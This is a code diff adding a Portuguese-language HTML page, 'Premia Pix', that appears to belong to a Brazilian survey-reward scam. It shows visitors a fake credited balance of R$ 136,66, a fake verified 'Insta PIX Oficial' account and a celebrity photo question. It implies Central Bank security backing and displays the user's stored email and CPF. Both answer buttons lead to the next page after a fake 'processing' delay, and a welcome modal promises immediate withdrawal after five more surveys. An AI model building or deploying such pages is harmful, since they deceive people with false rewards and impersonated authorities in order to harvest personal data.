@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Premia Pix</title>
+    <link rel="stylesheet" href="css/style.css">
+</head>
+<div id="modal" class="modal">
+    <div class="modal-content">
+        <p>Aguarde, processando...</p>
+    </div>
+</div>
+
+<body>
+    <main>
+        <div class="containerPages">
+            <div class="header">
+                <div class="topHeader" style="margin-top: 2vh;">
+                    <div class="leftHeader">
+                        <img src="images/insta-pix-logo.webp" alt="" style="height: 31px; width: 180px;">
+                    </div>
+                    <div class="rightHeader">
+                        <div style="display: flex; justify-content: center; align-items: center; flex-direction: column;">                         
+                            <b>Saldo a receber</b>
+                            <span style="display: flex; justify-content: center; align-items: center;background-color: #00BDAE; border-radius: 10px;padding: 2px;font-size: 15px;">
+                                R$ 136,66<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-circle-dollar-sign ml-2 size-4"><circle cx="12" cy="12" r="10"></circle><path d="M16 8h-6a2 2 0 1 0 0 4h4a2 2 0 1 1 0 4H8"></path><path d="M12 18V6"></path></svg>
+                            </span>
+                        </div>
+                    </div>
+                </div>
+                <div class="lowestHeader">
+                    <div class="leftHeader">
+                        <svg width="15" height="15" viewBox="0 0 15 15" fill="none" xmlns="http://www.w3.org/2000/svg" class="size-4 mr-2"><path d="M7.5 0.875C5.49797 0.875 3.875 2.49797 3.875 4.5C3.875 6.15288 4.98124 7.54738 6.49373 7.98351C5.2997 8.12901 4.27557 8.55134 3.50407 9.31167C2.52216 10.2794 2.02502 11.72 2.02502 13.5999C2.02502 13.8623 2.23769 14.0749 2.50002 14.0749C2.76236 14.0749 2.97502 13.8623 2.97502 13.5999C2.97502 11.8799 3.42786 10.7206 4.17091 9.9883C4.91536 9.25463 6.02674 8.87499 7.49995 8.87499C8.97317 8.87499 10.0846 9.25463 10.8291 9.98831C11.5721 10.7206 12.025 11.8799 12.025 13.5999C12.025 13.8623 12.2376 14.0749 12.5 14.0749C12.7623 14.075 12.975 13.8623 12.975 13.6C12.975 11.72 12.4778 10.2794 11.4959 9.31166C10.7244 8.55135 9.70025 8.12903 8.50625 7.98352C10.0187 7.5474 11.125 6.15289 11.125 4.5C11.125 2.49797 9.50203 0.875 7.5 0.875ZM4.825 4.5C4.825 3.02264 6.02264 1.825 7.5 1.825C8.97736 1.825 10.175 3.02264 10.175 4.5C10.175 5.97736 8.97736 7.175 7.5 7.175C6.02264 7.175 4.825 5.97736 4.825 4.5Z" fill="currentColor" fill-rule="evenodd" clip-rule="evenodd"></path></svg>
+                        <span id="emailDisplay"></span>
+                    </div>
+                    <div class="rightHeader">
+                        <p><b>CPF:</b> <span id="cpfDisplay"></span></p>
+                    </div>
+                </div>
+            </div>
+            <div class="card">
+                <div class="headerCard">
+                    <div class="leftHeaderCard">
+                        <img src="images/logo-insta-premia.webp" alt="" style="width: 40px; height: 40px;border-radius: 50%;border: 2px solid rgb(192, 93, 76);">
+                        <b style="margin-left: 1vh;">Insta PIX Oficial</b>
+                        <img src="images/verify.webp" alt="" style="width: 18px;height: 18px;margin-left: 1vh;">
+                    </div>
+                    <div class="rightHeaderCard">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-ellipsis size-4"><circle cx="12" cy="12" r="1"></circle><circle cx="19" cy="12" r="1"></circle><circle cx="5" cy="12" r="1"></circle></svg>
+                    </div>
+                </div>
+                <div class="bodyCard">
+                    <div style="margin-top: 3vh;">
+                        <b>Você conhece Virginia Fonseca?</b>
+                    </div>
+                    <div style="padding-left: 5vh; margin-top: 2vh;">
+                        <img src="images/virginia-fonseca.webp" alt="" style="border-radius: 10px;">
+                    </div>
+                    <div style="font-size: 15px; display: flex; align-items: center; flex-direction: row;margin-top: 1vh;">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-chart-no-axes-column-increasing size-4 mr-1"><line x1="12" x2="12" y1="20" y2="10"></line><line x1="18" x2="18" y1="20" y2="4"></line><line x1="6" x2="6" y1="20" y2="16"></line></svg>
+                        <b>1535.9 mil avaliações</b>
+                    </div>
+                    <div style="width: 95%; background-color: #FFFFFF;border-radius: 10px;padding: 10px;display: flex; align-items: center;flex-direction: column;margin-top: 2vh;">
+                        <b>Selecione uma das opções</b>
+                        <div style="margin-top: 1vh;">
+                            <a href="gustavoLima.html">
+                                <button style="width: 10vh;height: 40px;color: #FFFFFF;background-color: #8B0101;border-radius: 10px;cursor: pointer;">
+                                    Não
+                                </button>
+                            </a>
+                            <a href="gustavoLima.html">
+                                <button style="width: 10vh;height: 40px;color: #FFFFFF;background-color:#26C50C;border-radius: 10px;cursor: pointer;">
+                                    Sim
+                                </button>
+                            </a>
+                        </div>
+                    </div>
+                    <div style="display: flex; justify-content: center; align-items: center;flex-direction: column;margin-top: 5vh;">
+                        <p style="color: #FFFFFF;">Seguraça pelo</p>
+                        <img src="images/bc.webp" alt="" style="width: 200px; height: 13px;">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+    <div id="infoModal" class="modal-inicio">
+        <div class="modal-content-inicio">
+            <span class="close-saque" id="closeModal">&times;</span>
+            <b style="font-size: 30px; color: black;font-weight: bolder;">SEJA <b style="color: #00BDAE;font-size: 30px;font-weight: bolder;">BEM VINDO(A)</b> AO NOSSO APP!</b>
+            <p style="margin-top: 3vh;">Você ja tem R$ 136,66 reais de saldo em sua conta, só por realizar seu cadastro, incrível né?</p>
+            <p style="margin-top: 1vh;">Para você continuar ganhando avalie mais 5 pesquisas e realiza seu saque imediatamente!</p>
+            <button style="width: 312px; height: 44px; background-color: #005952; color: white; border-radius: 10px;margin-top: 5vh;cursor: pointer;" onclick="hideModalInicio()">Começar agora</button>
+        </div>
+    </div>
+    <script>
+        // Função para obter e exibir dados do localStorage
+        function loadUserData() {
+            const email = localStorage.getItem('email');
+            const cpf = localStorage.getItem('cpf');
+    
+            if (email) {
+                document.getElementById('emailDisplay').textContent = email;
+            }
+    
+            if (cpf) {
+                document.getElementById('cpfDisplay').textContent = cpf;
+            }
+        }
+        function showModalLoading() {
+        const modal = document.getElementById('modal');
+        modal.style.display = 'flex'; // Exibe o modal
+    }
+
+    // Função para esconder o modal
+    function hideModalLoading() {
+        const modal = document.getElementById('modal');
+        modal.style.display = 'none'; // Esconde o modal
+        window.location.href = 'gustavoLima.html';
+    }
+
+    // Adiciona eventos de clique aos botões
+    document.querySelectorAll('.card .bodyCard a button').forEach(button => {
+        button.addEventListener('click', (e) => {
+            e.preventDefault(); // Impede o link de ser seguido
+            showModalLoading(); // Mostra o modal
+            setTimeout(hideModalLoading, 2000); // Esconde o modal após 2 segundos (ou ajuste conforme necessário)
+        });
+    });
+        // Função para exibir o modal de boas-vindas
+        function showModalInicio() {
+            const modalInicio = document.getElementById('infoModal');
+            modalInicio.style.display = 'block'; // Exibe o modal
+        }
+    
+        // Função para esconder o modal de boas-vindas
+        function hideModalInicio() {
+            const modalInicio = document.getElementById('infoModal');
+            modalInicio.style.display = 'none'; // Esconde o modal
+        }
+    
+        // Adiciona evento de clique para fechar o modal
+        document.getElementById('closeModal').onclick = hideModalInicio;
+    
+        // Chama a função ao carregar a página
+        window.onload = function() {
+            loadUserData(); // Carrega dados do localStorage
+            showModalInicio(); // Mostra o modal de boas-vindas
+        };
+    </script>
+    
+</body>
+</html>
